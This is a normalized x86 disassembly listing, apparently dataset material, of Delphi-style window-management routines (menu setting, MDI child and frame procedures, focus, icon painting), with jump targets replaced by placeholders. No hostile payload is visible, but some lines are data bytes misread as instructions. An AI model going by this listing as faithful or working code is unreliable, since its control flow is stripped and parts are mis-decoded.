push sub_44ed0a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_452374
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_448654
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_452360
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41c588
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_452360
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
mov eax ebx
call sub_43bbec
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_44ea7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ed11
lea eax [ ebp - 0x10 ]
call sub_403e9c
retn
mov dl 0x1
mov eax ebx
call sub_44fc08
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_43b8e8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_43b8e8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_43b8e8
mov edx eax
mov eax esi
call sub_448654
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call SetMenu
sub_44ed2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ed18
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_44ed88
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44ed7c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_44edf4
push ebx
mov ebx eax
mov eax ebx
call sub_43af00
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_44eddc
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_44eddc
mov edx eax
mov eax ebx
call sub_4352ac
mov edx 0xff00000f
mov eax ebx
call sub_4352ac
pop ebx
retn
sub_44ee78
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_43b8e8
push eax
call ShowWindow
sub_44eeb8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e8d0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_44e8d0
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_452344
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_452330
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_44e8d0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_452330
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_452344
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_452330
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452034
push eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452018
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452000
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_452330
call sub_452000
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452000
push eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_45204c
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452034
push eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452018
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452000
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_45204c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452034
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_452330
call sub_452034
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452034
push eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452018
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452000
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_45204c
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452000
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_45204c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452034
push eax
mov edx esi
mov eax [ rw-data ]
call sub_452330
call sub_452018
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_44f20c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_44c7c0
mov edx esi
mov eax edi
call sub_451bb0
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_44f2bb ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43870c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43870c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_44f41d
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44c7d0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43b8e8
push eax
call SendMessageA
mov eax ebx
call sub_44fd7c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_43b8e8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_434b10
push eax
mov eax ebx
call sub_434b54
push eax
mov eax ebx
call sub_43b8e8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406a30
mov [ ebx + 0x254 ] eax
push ebx
push sub_44e368
call sub_41d548
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_445108
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_43b8e8
push eax
call SetWindowPos
jmp r-xdata
sub_44f56a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44f695
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_438a70
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_451a88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f69c
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_44f6a4
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_438cdc
push 0x0
mov eax ebx
call sub_43b8e8
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_44f6e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_439460
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_44f74c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f7f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f7fb
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
mov eax edi
call sub_44bae0
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403360
mov eax ebx
call sub_44fb04
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403360
test al al
jne r-xdata
sub_44f804
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_4383c4
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_4383c4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_44f74c
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_44f84c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_44f74c
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_44f870
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_416c5c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_416b94
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_416c5c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_416b94
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_44fae0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_43b8e8
mov dx 0xb000
call sub_44b8a8
test al al
jne r-xdata
call sub_43b8e8
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_44b8a8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fae7
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403984
jmp r-xdata
call sub_403984
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4383c4
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_43b8e8
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_44b8a8
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_4362b4
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
call sub_403984
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_43b8e8
mov dx 0xb01a
call sub_44b8a8
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403984
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_4362b4
sub_44fb04
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_4362b4
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_43b8e8
push eax
call SetFocus
mov eax ebx
call sub_43b8e8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_44fb54
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_4362b4
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44fc08
mov eax esi
call sub_44fb04
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_43bd10
mov edx eax
mov eax esi
call sub_44f74c
sub_44fbb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44e7d0
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_4362b4
mov eax ebx
call sub_44e7d0
mov edx esi
call sub_44fbb8
sub_44fc08
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_448c34
mov edx esi
call sub_448c18
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_44fcb0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_43b8e8
push eax
call SendMessageA
sub_44fcfc
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_44fcb0
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_44fd2c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_44fcb0
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_44fd98
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_420114
xor eax eax
push ebp
push sub_44fe46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_420440
xor eax eax
push ebp
push sub_44fe23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403360
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe2a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_420440
retn
sub_44fe54
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_44e7d0
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_44e804
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403360
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43abb0
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_44e850
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403360
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_44fef4
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b8e8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43b8e8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_44fd7c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43b8e8
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_439a78
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_44ff72
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
